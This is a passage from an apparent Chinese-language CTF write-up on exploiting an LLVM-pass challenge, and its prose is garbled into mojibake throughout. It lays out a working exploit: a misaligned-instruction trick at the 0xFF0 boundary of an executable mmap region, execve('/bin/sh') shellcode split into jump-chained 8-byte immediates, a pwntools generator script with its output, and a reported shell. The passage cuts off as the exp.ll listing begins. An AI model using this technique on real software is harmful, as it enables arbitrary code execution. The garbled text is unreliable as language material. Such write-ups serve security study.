handleå‡½æ•°çš„æœ€åä¸€ä¸ªéƒ¨åˆ†ï¼Œå’ŒSegment 7ç›¸åŒï¼ŒSegment 7å¤„ç†çš„æ˜¯åŠ å‡æ³•çš„ç¬¬ä¸€ä¸ªæ“ä½œæ•°ï¼Œè€ŒSegment 8ä»¥åŒæ ·çš„æ–¹å¼å¤„ç†ç¬¬äºŒä¸ªæ“ä½œæ•°ã€‚ä¸è¿‡åœ¨æ­¤ä¹‹å‰æœ‰ä¸€ä¸ªåˆ¤æ–­ç¬¦å·çš„ifè¯­å¥ï¼Œå½“è¿ç®—ä¸ºå‡çš„æ—¶å€™ä¼šå°†v22å–ç›¸åæ•°ã€‚</p>
<p>çœ‹åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬å·²ç»å¯¹handleå‡½æ•°æœ‰äº†ä¸€äº›åˆæ­¥çš„äº†è§£ï¼Œä½†æ˜¯åœ¨ç»†èŠ‚æ–¹é¢çš„ç†è§£è¿˜æ˜¯ä¸å¤Ÿé€å½»ã€‚å› æ­¤æˆ‘ä»¬æ¥å°è¯•å†™ä¸€ä¸ªå‡½æ•°ï¼Œçœ‹çœ‹handleå‡½æ•°å¤„ç†çš„å…¨è¿‡ç¨‹åˆ°åº•æ˜¯ä»€ä¹ˆæ ·çš„ã€‚</p>
<p>è¿™æ˜¯æ ¹æ®readmeå‡½æ•°æ”¹ç¼–çš„ä¸€æ®µä»£ç ï¼Œåªæœ‰åé¢çš„æ•°å€¼ä¿®æ”¹äº†ï¼ˆæ³¨æ„æœ¬é¢˜çš„.llæ–‡ä»¶ä¸èƒ½é€šè¿‡clangç”Ÿæˆï¼Œå› ä¸ºclangç”Ÿæˆçš„.llä»£ç ä¼šæœ‰ä¸€äº›storeç­‰å…¶ä»–æŒ‡ä»¤çš„å­˜åœ¨ï¼Œmbapassæ— æ³•è¯†åˆ«ï¼‰ã€‚æˆ‘ä»¬ä¸‹æ–­ç‚¹åˆ°stackææ„å‡½æ•°è°ƒç”¨çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯handleå‡½æ•°çš„æœ«å°¾ï¼Œçœ‹ä¸€ä¸‹æ­¤æ—¶this+4è¿™ä¸ªmmapç©ºé—´çš„æƒ…å†µã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">; ModuleID = &#x27;test.c&#x27;</span><br><span class="line">source_filename = &quot;test.c&quot;</span><br><span class="line">target datalayout = &quot;e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128&quot;</span><br><span class="line">target triple = &quot;x86_64-pc-linux-gnu&quot;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define dso_local i64 @test(i64 %0) #0 &#123;</span><br><span class="line">  %2 = sub nsw i64 %0, 285912734</span><br><span class="line">  %3 = add nsw i64 %2, 685392891</span><br><span class="line">  %4 = add nsw i64 %0, 653902180</span><br><span class="line">  %5 = add nsw i64 %4, -204343281</span><br><span class="line">  %6 = add nsw i64 %5, %3</span><br><span class="line">  ret i64 %6</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 = &#123; noinline nounwind optnone uwtable &quot;disable-tail-calls&quot;=&quot;false&quot; &quot;frame-pointer&quot;=&quot;all&quot; &quot;less-precise-fpmad&quot;=&quot;false&quot; &quot;min-legal-vector-width&quot;=&quot;0&quot; &quot;no-infs-fp-math&quot;=&quot;false&quot; &quot;no-jump-tables&quot;=&quot;false&quot; &quot;no-nans-fp-math&quot;=&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;=&quot;false&quot; &quot;no-trapping-math&quot;=&quot;true&quot; &quot;stack-protector-buffer-size&quot;=&quot;8&quot; &quot;target-cpu&quot;=&quot;x86-64&quot; &quot;target-features&quot;=&quot;+cx8,+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;tune-cpu&quot;=&quot;generic&quot; &quot;unsafe-fp-math&quot;=&quot;false&quot; &quot;use-soft-float&quot;=&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags = !&#123;!0&#125;</span><br><span class="line">!llvm.ident = !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 = !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 = !&#123;!&quot;Ubuntu clang version 12.0.0-3ubuntu1~20.04.5&quot;&#125;</span><br></pre></td></tr></table></figure>
<p>ä¸‹é¢æ˜¯mmapç©ºé—´çš„æƒ…å†µï¼š<br />
<img src="13.png" alt="" /><br />
å¯ä»¥çœ‹å‡ºhandleå‡½æ•°å°†æˆ‘ä»¬çš„5è¡Œä»£ç è½¬æ¢ä¸ºäº†æ±‡ç¼–æŒ‡ä»¤ä¿å­˜ã€‚å’Œé™æ€åˆ†æçš„ç»“æœç¬¦åˆã€</p>
<h2 id="step-5-åˆ†æcallcodeå‡½æ•°æ€è€ƒåˆ©ç”¨æ–¹å¼"><a class="markdownIt-Anchor" href="#step-5-åˆ†æcallcodeå‡½æ•°æ€è€ƒåˆ©ç”¨æ–¹å¼"></a> Step 5: åˆ†æcallCodeå‡½æ•°ï¼Œæ€è€ƒåˆ©ç”¨æ–¹å¼</h2>
<p><img src="14.png" alt="" /><br />
callCodeå‡½æ•°å¾ˆç®€å•ï¼Œå°±æ˜¯æ‰§è¡Œåˆšåˆšå†™å…¥åˆ°mmapç©ºé—´çš„æ±‡ç¼–æŒ‡ä»¤ã€‚</p>
<p>ç”±æ­¤å¯è§ï¼Œæˆ‘ä»¬å¯ä»¥æ‰§è¡Œè¿™ä¸€æ®µæŒ‡ä»¤ã€‚ä½†æ˜¯è¿™é‡Œçš„æŒ‡ä»¤åªèƒ½æ˜¯æœ‰é™çš„å‡ ç§ï¼Œå¹¶ä¸èƒ½è¾¾åˆ°æˆ‘ä»¬çš„ç›®çš„ã€‚ä¸è¿‡åˆ«å¿˜äº†æˆ‘ä»¬ç¬¬4æ­¥åˆ†æhandleå‡½æ•°æ—¶æ³¨æ„åˆ°çš„ä¸€ä¸ªå°ç»†èŠ‚ï¼šå½“ç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤é•¿åº¦å¤§äº0xFF0æ—¶ï¼Œhandleå‡½æ•°ä¸ä¼šå†ç»§ç»­å‘ä¸‹è§£æ.llä»£ç ï¼Œè€Œæ˜¯ä¼šç›´æ¥é€€å‡ºã€‚ä½†å¾ˆæ˜æ˜¾æˆ‘ä»¬å®Œå…¨æœ‰å¯èƒ½è®©handleå‡½æ•°ç”Ÿæˆçš„æ±‡ç¼–æŒ‡ä»¤é•¿åº¦æ¯”0xFF0å¤§å‡ ä¸ªå­—èŠ‚ï¼Œå³è®©æœ€åä¸€æ¡æŒ‡ä»¤è¶Šè¿‡0xFF0çš„è¾¹ç•Œã€‚æ³¨æ„å…¶ä¾ç„¶ä¼šæ‰§è¡Œã€‚è€Œä¸”<strong>mmapå‡ºæ¥çš„ç©ºé—´æ²¡æœ‰è¢«é‡Šæ”¾</strong>ï¼Œè¿™è¯´æ˜å½“handleå‡½æ•°è§£æç¬¬äºŒä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¹‹å‰è§£æå¾—åˆ°çš„æŒ‡ä»¤è¿˜ä¿ç•™åœ¨mmapç©ºé—´ä¸­ã€‚å¦‚æœä¸¤æ¬¡è§£æå‡ºæ¥çš„æŒ‡ä»¤æœ‰é”™ä½ï¼Œå°±å¯èƒ½ä¼šäº§ç”Ÿæ–°çš„æŒ‡ä»¤ã€‚</p>
<p>å¦‚ç¬¬ä¸€æ¬¡è§£æçš„æŒ‡ä»¤ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movabs rax, 0	; 0x0</span><br><span class="line">movabs rax, 0x12345678	; 0xA</span><br><span class="line">mov rbx, rax	; 0x14</span><br><span class="line">movabs rax, 0x87654321	; 0x1E</span><br></pre></td></tr></table></figure>
<p>ç¬¬äºŒæ¬¡è§£æçš„æŒ‡ä»¤ä¸ºï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">movabs rax, 0	; 0x0</span><br><span class="line">movabs rax, 0x12345678	; 0xA</span><br><span class="line">mov rbx, rax	; 0x14</span><br><span class="line">mov rbx, rax	; 0x17</span><br></pre></td></tr></table></figure>
<p>é‚£ä¹ˆå¯¹äº0x1A~0x1Eè¿™5ä¸ªå­—èŠ‚ï¼Œå¦‚æœæœ‰å®é™…å«ä¹‰çš„è¯ï¼Œå¾ˆå¯èƒ½ä¼šè¢«å½“æˆæ±‡ç¼–æŒ‡ä»¤æ‰§è¡Œï¼Œè€Œè¿™5ä¸ªå­—èŠ‚åœ¨ç¬¬ä¸€æ¬¡è§£æä¸­æ˜¯ä½œä¸ºç«‹å³æ•°å­˜åœ¨ï¼Œæ˜¯å¯ä»¥è¢«æˆ‘ä»¬éšæ„æ§åˆ¶çš„ã€‚ç”±æ­¤æˆ‘ä»¬å°±å¯ä»¥æ‰§è¡Œä¸€æ¡é•¿åº¦ä¸å¤§äº5å­—èŠ‚çš„ä»»æ„æŒ‡ä»¤ã€‚ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å†™çš„æ±‡ç¼–æŒ‡ä»¤é•¿åº¦ä¸è¶³0xFF0å­—èŠ‚ï¼Œåœ¨å¾ªç¯ä¸­ä¼šå†™å…¥ä¸€ä¸ªretæŒ‡ä»¤è¿›å»ï¼Œè·³å‡ºå¾ªç¯çš„æ¡ä»¶å°±æ˜¯æ±‡ç¼–æŒ‡ä»¤é•¿åº¦å¤§äº0xFF0ï¼Œå› æ­¤è¦æƒ³å¾ªç¯ä¸­æ·»åŠ retæŒ‡ä»¤çš„è¿™ä¸ªå‡½æ•°ä¸è°ƒç”¨ï¼Œå°±å¿…é¡»è¦ä½¿å¾—å†™å…¥çš„æ±‡ç¼–æŒ‡ä»¤é•¿åº¦å¤§äº0xFF0å­—èŠ‚ï¼Œè¿™æ ·æ‰èƒ½å¤Ÿæ‰§è¡Œ0xFF0åé¢å‡ ä¸ªå­—èŠ‚çš„ä»»æ„ä»£ç ã€‚</p>
<p>é€šè¿‡æµ‹è¯•æˆ‘ä»¬å¯ä»¥å‘ç°ï¼ŒincæŒ‡ä»¤å ç”¨3å­—èŠ‚ï¼Œmov rax, rbxæŒ‡ä»¤å ç”¨3å­—èŠ‚ï¼Œå‘raxæˆ–rbxç›´æ¥èµ‹å€¼å ç”¨10å­—èŠ‚ã€‚ç”±äº3å’Œ10çš„æœ€å¤§å…¬å› æ•°ä¸º1ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ ä»»æ„é•¿åº¦åœ¨0xFF0å·¦å³çš„æ±‡ç¼–ä»£ç ã€‚ä½†æ˜¯å¾ˆæ˜æ˜¾ï¼Œä¸å¯èƒ½æœ‰shellcodeèƒ½å¤Ÿç”¨ä»…ä»…å‡ ä¸ªå­—èŠ‚å°±getshellã€‚è€ƒè™‘åˆ°æˆ‘ä»¬å¯ä»¥æ§åˆ¶movabsæŒ‡ä»¤ä¸­çš„å8å­—èŠ‚ï¼Œå¯ä»¥å°†shellcodeå†™åˆ°è¿™ä¸€ä¸ªä¸ªçš„8å­—èŠ‚ä¹‹ä¸­ï¼Œå†é€šè¿‡çŸ­è½¬ç§»æŒ‡ä»¤å°†å®ƒä»¬è¿æ¥åœ¨ä¸€èµ·ï¼Œå°±æœ‰å¯èƒ½æ‰§è¡Œä¸€ä¸ªå®Œæ•´çš„shellcodeã€‚<strong>æ³¨æ„ï¼šçŸ­è½¬ç§»æŒ‡ä»¤çš„é•¿åº¦ä¸º2å­—èŠ‚ï¼Œå› æ­¤æ¯ä¸€ä¸ª8å­—èŠ‚ä¸­çš„æŒ‡ä»¤ä¸èƒ½è¶…è¿‡6å­—èŠ‚ã€‚å› æ­¤ç°æœ‰çš„shellcodeå¯èƒ½æ— æ³•ç›´æ¥ä½¿ç”¨ï¼Œéœ€è¦æˆ‘ä»¬æ ¹æ®å®é™…çš„è°ƒè¯•ç»“æœè¿›è¡Œä¸€å®šçš„è°ƒæ•´ã€‚</strong></p>
<p>ä¸ºäº†shellcodeç¼–å†™çš„æ–¹ä¾¿ï¼Œæˆ‘ä»¬å°†movabsæŒ‡ä»¤ä½œä¸ºæˆ‘ä»¬å†™å…¥çš„ä¸»è¦æŒ‡ä»¤ã€‚é€šè¿‡å‰é¢çš„è°ƒè¯•ç»“æœå¯ä»¥å¾—çŸ¥ï¼Œç»å¤§å¤šæ•°çš„movabsæŒ‡ä»¤åé¢éƒ½å›è·Ÿä¸Šä¸€ä¸ªadd rax, rbxæŒ‡ä»¤ã€‚æˆ‘ä»¬äººä¸ºè§„å®šæ¯ä¸€ä¸ªmovabsä¸­å†™å…¥ä¸€æ¡æŒ‡ä»¤ï¼Œç„¶åé€šè¿‡çŸ­è½¬ç§»æŒ‡ä»¤è·³åˆ°å‰é¢ä¸€ä¸ªmovabsä¸­çš„æŒ‡ä»¤ã€‚</p>
<p>ä¸‹é¢ï¼Œæˆ‘ä»¬å°±æ¥æ„é€ æˆ‘ä»¬é¢„æœŸè¦æ‰§è¡Œçš„shellcodeã€‚</p>
<h2 id="step-6-æ„é€ shellcode"><a class="markdownIt-Anchor" href="#step-6-æ„é€ shellcode"></a> Step 6: æ„é€ shellcode</h2>
<p>æˆ‘ä»¬ç›´æ¥ä½¿ç”¨pwntoolsä¸­ç»™å‡ºçš„æ¨¡æ¿ï¼Œåœ¨å…¶åŸºç¡€ä¸Šè¿›è¡Œä¿®æ”¹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">/* execve(path=&#x27;/bin///sh&#x27;, argv=[&#x27;sh&#x27;], envp=0) */</span><br><span class="line">/* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="line">push 0x68</span><br><span class="line">mov rax, 0x732f2f2f6e69622f</span><br><span class="line">push rax</span><br><span class="line">mov rdi, rsp</span><br><span class="line">/* push argument array [&#x27;sh\x00&#x27;] */</span><br><span class="line">/* push b&#x27;sh\x00&#x27; */</span><br><span class="line">push 0x1010101 ^ 0x6873</span><br><span class="line">xor dword ptr [rsp], 0x1010101</span><br><span class="line">xor esi, esi /* 0 */</span><br><span class="line">push rsi /* null terminate */</span><br><span class="line">push 8</span><br><span class="line">pop rsi</span><br><span class="line">add rsi, rsp</span><br><span class="line">push rsi /* &#x27;sh\x00&#x27; */</span><br><span class="line">mov rsi, rsp</span><br><span class="line">xor edx, edx /* 0 */</span><br><span class="line">/* call execve() */</span><br><span class="line">push SYS_execve /* 0x3b */</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
<ol>
<li><code>push 0x68</code>ï¼šæœºå™¨ç <code>jh</code>ï¼Œå ç”¨2å­—èŠ‚ã€‚</li>
<li><code>mov rax, 0x732f2f2f6e69622f</code>ï¼šå ç”¨10å­—èŠ‚ï¼Œè¿›è¡Œæ”¹å†™ï¼š<br />
(1) <code>mov eax, 0x732f2f2f</code>ï¼šæœºå™¨ç <code>\xb8///s</code>ï¼Œå ç”¨5å­—èŠ‚ã€‚<br />
(2) <code>shl rax, 32</code>ï¼šæœºå™¨ç <code>H\xc1\xe0&lt;space&gt;</code>ï¼Œå ç”¨4å­—èŠ‚ï¼ˆ&lt;space&gt;æŒ‡ç©ºæ ¼ï¼‰ã€‚<br />
(3) <code>add rax, 0x6e69622f</code>ï¼šæœºå™¨ç <code>H\x05/bin</code>ï¼Œå ç”¨6å­—èŠ‚ã€‚</li>
<li><code>push rax</code>ï¼šæœºå™¨ç <code>P</code>ï¼Œå ç”¨1å­—èŠ‚ã€‚</li>
<li><code>mov rdi, rsp</code>ï¼šæœºå™¨ç <code>H\x89\xe7</code>ï¼Œå ç”¨3å­—èŠ‚ã€‚</li>
<li><code>push 0x1010101 ^ 0x6873</code>ï¼šæœºå™¨ç <code>hri\x01\x01</code>ï¼Œä½†å…¶ä¸ä¸‹ä¸€æ­¥å¯ä»¥åˆå¹¶ï¼š<br />
<code>push 0x6873</code>ï¼šæœºå™¨ç <code>hsh\x00\x00</code>ï¼Œå ç”¨5å­—èŠ‚ã€‚</li>
<li><code>xor esi, esi</code>ï¼šæœºå™¨ç <code>1\xf6</code>ï¼Œå ç”¨2å­—èŠ‚ã€‚</li>
<li><code>push rsi</code>ï¼šæœºå™¨ç <code>V</code>ï¼Œå ç”¨1å­—èŠ‚ã€‚</li>
<li><code>push 8</code>ï¼šæœºå™¨ç <code>j\x08</code>ï¼Œå ç”¨2å­—èŠ‚ã€‚</li>
<li><code>pop rsi</code>ï¼šæœºå™¨ç <code>^</code>ï¼Œå ç”¨1å­—èŠ‚ã€‚</li>
<li><code>add rsi, rsp</code>ï¼šæœºå™¨ç <code>H\x01\xe6</code>ï¼Œå ç”¨3å­—èŠ‚ã€‚</li>
<li><code>push rsi</code>ï¼šæœºå™¨ç <code>V</code>ï¼Œå ç”¨1å­—èŠ‚ã€‚</li>
<li><code>mov rsi, rsp</code>ï¼šæœºå™¨ç <code>H\x89\xe6</code>ï¼Œå ç”¨3å­—èŠ‚ã€‚</li>
<li><code>xor edx, edx</code>ï¼šæœºå™¨ç <code>1\xd2</code>ï¼Œå ç”¨2å­—èŠ‚ã€‚</li>
<li><code>push SYS_execve</code>ï¼šæœºå™¨ç <code>j;</code>ï¼Œå ç”¨2å­—èŠ‚ã€‚</li>
<li><code>pop rax</code>ï¼šæœºå™¨ç <code>X</code>ï¼Œå ç”¨1å­—èŠ‚ã€‚</li>
<li><code>syscall</code>ï¼šæœºå™¨ç <code>\x0f\x05</code>ï¼Œå ç”¨2å­—èŠ‚ã€‚</li>
</ol>
<p>æœºå™¨ç åˆ†æå®Œæ¯•ã€‚æˆ‘ä»¬å‘ç°æœ‰ä¸€äº›æŒ‡ä»¤å¾ˆçŸ­ï¼Œå¯ä»¥å‡ æ¡åˆå¹¶ã€‚å¦‚3å’Œ4åˆå¹¶ã€6å’Œ7å’Œ8å’Œ9åˆå¹¶ã€10å’Œ11åˆå¹¶ã€12å’Œ13åˆå¹¶ã€14å’Œ15å’Œ16åˆå¹¶ã€‚ä½†æ˜¯ä¸ºäº†æ‰¹é‡ç”ŸæˆæŒ‡ä»¤æœºå™¨ç çš„æ–¹ä¾¿ï¼Œæ¯ä¸ª8å­—èŠ‚ä¸­åªå¡«å……ä¸€ä¸ªshellcodeæŒ‡ä»¤ã€‚æˆ‘ä»¬è®©çŸ­è½¬ç§»æŒ‡ä»¤å›ºå®šåœ¨æœ€å2å­—èŠ‚ï¼Œå‰é¢çš„æŒ‡ä»¤ä¸å¤Ÿ6å­—èŠ‚çš„ä½¿ç”¨nopæŒ‡ä»¤è¡¥å……ã€‚æˆ‘ä»¬ä½¿ç”¨è„šæœ¬å°è¯•ç”Ÿæˆä¸€ä¸‹ï¼š</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">shellcode = [</span><br><span class="line">			 <span class="string">&quot;push 0x68&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;mov eax, 0x732f2f2f&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;shl rax, 32&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;add rax, 0x6e69622f&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push rax&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;mov rdi, rsp&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push 0x6873&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;xor esi, esi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push rsi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push 8&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;pop rsi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;add rsi, rsp&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push rsi&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;mov rsi, rsp&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;xor edx, edx&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;push SYS_execve&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;pop rax&quot;</span>,</span><br><span class="line">	     	 <span class="string">&quot;syscall&quot;</span></span><br><span class="line">	     	]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> code <span class="keyword">in</span> shellcode:</span><br><span class="line">	<span class="built_in">bytes</span> = asm(code).ljust(<span class="number">6</span>, <span class="string">b&#x27;\x90&#x27;</span>) + <span class="string">b&#x27;\xEB\xE9&#x27;</span>	<span class="comment"># \xEB\xEB: jmp short ptr -21, æ€è€ƒä¸€ä¸‹-21è¿™ä¸ªæ•°æ˜¯æ€ä¹ˆå¾—å‡ºæ¥çš„</span></span><br><span class="line">	<span class="built_in">print</span>(u64(<span class="built_in">bytes</span>))</span><br></pre></td></tr></table></figure>
<p>è¾“å‡ºç»“æœï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">16999840169015142506</span><br><span class="line">16999840042827329464</span><br><span class="line">16999840167141359944</span><br><span class="line">16999802617337939272</span><br><span class="line">16999840169015152720</span><br><span class="line">16999840169020852552</span><br><span class="line">16999839548121314152</span><br><span class="line">16999840169015178801</span><br><span class="line">16999840169015152726</span><br><span class="line">16999840169015117930</span><br><span class="line">16999840169015152734</span><br><span class="line">16999840169020752200</span><br><span class="line">16999840169015152726</span><br><span class="line">16999840169020787016</span><br><span class="line">16999840169015169585</span><br><span class="line">16999840169015130986</span><br><span class="line">16999840169015152728</span><br><span class="line">16999840169015117071</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦è¿›è¡Œè°ƒè¯•ï¼Œæ„é€ å‡ºèƒ½å¤Ÿäº§ç”ŸjmpæŒ‡ä»¤ä¸¤ä¸ªé•¿å‡½æ•°ä»¥ä¾›handleå‡½æ•°è§£æã€‚</p>
<h2 id="step-7-getshell"><a class="markdownIt-Anchor" href="#step-7-getshell"></a> Step 7: getshell</h2>
<p>æˆ‘ä»¬åœ¨ä¸€ä¸ªå‡½æ•°ä¸­å†™å…¥å¾ˆå¤šçš„addæŒ‡ä»¤ï¼Œå°±åƒä¸‹é¢è¿™æ ·ã€‚ç»è¿‡æµ‹è¯•å¾—å‡º=ï¼Œå½“å†™åˆ°%315æ—¶ï¼Œæœ‰ä¸€ä¸ªmovabsæŒ‡ä»¤èƒ½å¤ŸæˆåŠŸæº¢å‡ºåˆ°0xFF0ä¹‹åï¼Œä¸è¿‡è¿™æ˜¯ç¬¬ä¸€æ¡æŒ‡ä»¤ã€‚å› æ­¤æˆ‘ä»¬å†™shellcodeåº”è¯¥å†™åœ¨å‰é¢å‡ ä¸ªæŒ‡ä»¤ä¸­ã€‚<br />
<img src="15.png" alt="" /><br />
ä¸‹é¢æ˜¯è§£æç¬¬ä¸€ä¸ªå‡½æ•°åæœ€åå‡ ä¸ªå­—èŠ‚çš„æƒ…å†µï¼š<br />
<img src="16.png" alt="" /><br />
ä¸‹é¢æ˜¯è§£æç¬¬äºŒä¸ªå‡½æ•°åæœ€åå‡ ä¸ªå­—èŠ‚çš„æƒ…å†µï¼š<br />
<img src="17.png" alt="" /><br />
ç”±ä¸‹å›¾å¯ä»¥å¾—å‡ºï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ˜¯ç¬¬ä¸€ä¸ªå‡½æ•°æœ€åä¸€ä¸ªmovabsä¸­æœ€åçš„4ä¸ªå­—èŠ‚ï¼š<br />
<img src="18.png" alt="" /><br />
æ ¹æ®ä¸‹å›¾å¯çŸ¥ï¼Œç¬¬ä¸€ä¸ªçŸ­è½¬ç§»ï¼ˆå³å›¾ä¸­çš„jmpï¼‰åç§»åº”è¯¥ä¸ºï¼š<code>-(0xff3-(0xfde+2))=-0x13=0xed</code><br />
<img src="19.png" alt="" /><br />
å¦‚å›¾æ‰€ç¤ºï¼Œè¿™æ ·å°±å¯ä»¥è·³è½¬åˆ°æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ªshellcodeäº†ã€‚ç¬¬ä¸€ä¸ªç«‹å³æ•°çš„å€¼åº”è¯¥ä¸º<code>0xEDEB00000000</code>ã€‚ï¼ˆä½4å­—èŠ‚æ— æ‰€è°“ï¼‰<br />
<img src="20.png" alt="" /><br />
ç„¶åæˆ‘ä»¬åªè¦å°†ä¸Šé¢è„šæœ¬ä¸­çš„å€¼ä¾æ¬¡å†™å…¥åˆ°ä¸‹é¢å³å¯ã€‚<br />
<img src="21.png" alt="" /><br />
æˆåŠŸgetshellã€‚<br />
<img src="22.png" alt="" /><br />
exp.llå¦‚ä¸‹ï¼š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span 